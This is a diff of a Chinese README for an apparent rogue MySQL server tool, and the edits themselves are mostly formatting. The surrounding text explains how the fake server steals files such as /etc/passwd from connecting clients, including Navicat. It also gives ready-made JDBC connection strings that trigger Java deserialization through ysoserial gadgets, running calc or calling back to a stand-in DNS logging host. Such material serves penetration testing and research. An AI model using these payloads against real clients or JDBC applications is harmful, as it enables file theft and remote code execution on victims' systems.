@@ -14,6 +14,7 @@
 1. 需要python3环境，无任何其它依赖。
 2. 需要[ysoserial](https://github.com/frohoff/ysoserial)才能用反序列化功能。
 3. MySQL的用户名支持冒号、斜杠等特殊符号，但是能否使用还需看具体客户端环境。
+4. 运行：`python server.py`
 
 ## 测试环境：
 1. jdk1.8.20+mysql-connector-java 8.0.14/5.1.22(Windows下反序列化)
@@ -23,15 +24,15 @@
 ## 使用方法
 1. 文件读取：
     - 可以在config.json中fileread节中预定义好要读取的文件,key为用户名,value为要读取的文件名
-    - 可以用fileread_开头的用户名，比如fileread\_/etc/passwd来读取/etc/passwd文件
+    - 可以用fileread_开头的用户名(例如使用用户名fileread\_/etc/passwd来读取/etc/passwd文件)
 2. 反序列化
     - 可在config.json中yso节预定义好yso payload的生成参数，key为用户名，value为ysoserial的参数
-    - 可以用yso_开头的用户名，格式yso\_payload类型\_命令（例如jdk7u21调用calc就用yso\_Jdk7u21_calc）
+    - 可以用yso_开头的用户名，格式yso\_payload类型\_命令（例如jdk7u21调用calc就使用用户名yso\_Jdk7u21\_calc）
     - jdbc连接串示例：
       - 8.0.7以上：`jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_Jdk7u21_calc`
       - 5.x:`jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_URLDNS_http://yourdns.log.addr/`
-3. 关于认证：默认认证插件一般使用**mysql_native_password**,但是由于议实现的问题，navicat下会连接失败，此时在使用的用户名后追加**_clear**即可切换为mysql_clear_password,navicat连接成功,读取到文件。
-    - **例如：**fileread\_/etc/passwd_clear
+3. 关于认证：默认认证插件一般使用**mysql_native_password**,但是由于议实现的问题，navicat下会连接失败，此时在使用的用户名后追加 **_clear** 即可切换为mysql_clear_password,navicat连接成功,读取到文件。
+    - **例如：** fileread\_/etc/passwd_clear
 
 ## 踩过的坑
 
@@ -52,6 +53,8 @@ https://www.anquanke.com/post/id/200462
 
 **项目基础：**
 https://github.com/waldiTM/python-mysqlproto
+
+
 膜拜大佬实现的Python版mysql协议，一切都是在此项目上进行的修改。
 
 **漏洞相关:**
@@ -64,5 +67,7 @@ https://github.com/codeplutos/MySQL-JDBC-Deserialization-Payload
 
 **协议相关：**
 https://dev.mysql.com/doc/internals/en/protocoltext-resultset.html
+
 https://dev.mysql.com/doc/internals/en/character-set.html
+
 https://dev.mysql.com/doc/internals/en/com-query-response.html#packet-Protocol::LOCAL_INFILE_Data
